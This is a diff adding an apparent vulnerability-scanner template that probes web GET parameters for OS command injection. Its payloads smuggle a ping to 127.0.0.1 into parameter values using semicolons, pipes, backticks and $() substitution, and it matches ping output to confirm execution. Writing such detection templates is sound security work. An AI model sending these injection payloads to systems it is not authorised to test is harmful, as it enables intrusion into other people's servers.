@@ -1,0 +1,47 @@
+id: command-injection-ping
+info:
+  name: OS Command Injection via Ping Probe
+  severity: critical
+  tags: [injection, rce, command-injection, dast, linux]
+  description: "Probes execution-oriented GET parameters with ping-based OS command payloads. A response containing ping statistics, TTL values, or ICMP sequence numbers confirms server-side shell command execution."
+  remediation: "Never pass user-controlled input to OS command execution functions. Use language-native equivalents and reject all shell metacharacters at the input validation layer."
+  cwe: "CWE-78"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  payload:
+    - "ping+-c+1+127.0.0.1"
+    - "; ping -c 1 127.0.0.1 ;"
+    - "| ping -c 1 127.0.0.1"
+    - "`ping -c 1 127.0.0.1`"
+    - "$(ping -c 1 127.0.0.1)"
+
+requests:
+  - method: GET
+    paths:
+      - "/?cmd={{payload}}"
+      - "/?exec={{payload}}"
+      - "/?shell={{payload}}"
+      - "/?command={{payload}}"
+      - "/?run={{payload}}"
+      - "/?host={{payload}}"
+      - "/?ping={{payload}}"
+      - "/?ip={{payload}}"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)ttl=\\d+"
+          - "bytes from 127\\.0\\.0\\.1"
+          - "(?i)packets transmitted"
+          - "(?i)rtt min"
+          - "icmp_seq=\\d+"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "PING 127.0.0.1"
+          - "ping statistics"
+          - "min/avg/max"
+        part: body
+        condition: or
